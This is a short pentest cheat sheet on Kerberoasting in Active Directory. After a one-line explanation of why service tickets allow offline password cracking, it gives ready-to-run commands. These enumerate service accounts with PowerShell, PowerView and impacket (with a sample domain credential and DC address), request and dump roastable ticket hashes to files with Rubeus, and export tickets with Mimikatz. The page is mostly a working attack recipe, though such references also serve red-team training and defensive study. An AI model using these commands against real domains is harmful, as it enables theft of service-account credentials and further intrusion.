# Kerberoasting

the TGS encrypted using a password service account

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption><p>the TGS encrypted using password service account</p></figcaption></figure>

{% hint style="warning" %}
The Kerberos session ticket (TGS) has a server portion that is encrypted with the password hash of the service account. This makes it possible to request a ticket and do an offline password attack
{% endhint %}

### Enumeration

<pre class="language-bash"><code class="lang-bash">#Find user accounts used as Service accounts
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-NetUser -SPN 
Get-DomainUser -SPN
#using impacket tools
<strong>impacket-GetUserSPNs hacktor.local/grey:digi@123 -dc-ip 192.168.1.50 -request
</strong></code></pre>

### Rubeus

{% code overflow="wrap" %}
```powershell
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /user:svcadmin /simple
#Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
Rubeus.exe kerberoast  /outfile:hashes.txt
#OR Native Command
Add-Type -AssemblyName System.IdentityModel ;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/msp-sqlreport.msp.local"  
```
{% endcode %}

### mimikatz

```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'

```
